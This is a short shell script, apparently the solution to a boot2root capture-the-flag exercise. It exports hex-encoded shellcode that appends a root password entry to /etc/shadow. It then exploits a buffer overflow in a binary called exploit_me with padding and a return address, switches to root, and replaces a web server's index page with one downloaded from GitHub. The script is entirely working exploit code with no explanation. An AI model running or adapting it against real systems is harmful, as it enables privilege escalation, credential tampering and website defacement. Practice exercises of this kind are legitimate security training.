export SHELLCODE=$(python -c 'print "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\xb0\x05\x66\xb9\x41\x02\x66\xba\xb8\x01\xcd\x80\x89\xc3\x31\xc0\x50\x68\x3a\x3a\x20\x20\x68\x39\x3a\x37\x3a\x68\x39\x39\x39\x39\x68\x34\x3a\x30\x3a\x68\x31\x39\x36\x38\x68\x63\x6c\x30\x3a\x68\x44\x50\x4d\x43\x68\x31\x64\x4b\x5a\x68\x53\x4b\x69\x67\x68\x43\x30\x46\x42\x68\x4d\x4e\x77\x6f\x68\x4e\x53\x57\x4e\x68\x6b\x4b\x65\x37\x68\x71\x76\x45\x74\x68\x67\x56\x45\x32\x68\x41\x47\x2e\x77\x68\x69\x36\x73\x37\x68\x76\x6d\x70\x66\x68\x63\x56\x54\x6a\x68\x4a\x4c\x64\x70\x68\x41\x43\x58\x62\x68\x50\x4d\x66\x42\x68\x50\x4b\x56\x7a\x68\x74\x39\x6d\x35\x68\x31\x79\x45\x2f\x68\x56\x69\x45\x6a\x68\x24\x55\x68\x34\x68\x61\x6d\x45\x37\x68\x54\x4a\x64\x31\x68\x3a\x24\x36\x24\x68\x72\x6f\x6f\x74\xb0\x04\x31\xd2\x89\xe1\xb2\x7a\xcd\x80\xb0\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80"')
env - PWD=$PWD SHELLCODE="$SHELLCODE" ~/exploit_me $(python -c 'print "A" * 140 + "\xbf\xff\xff\x0e"[::-1]')
su root
cd /var/www && rm index.html && wget https://raw.githubusercontent.com/lorenzoedoardofrancesco/42Cursus/boot2root/main/scripts/bonus/dontTouchMyWebSocket/index.html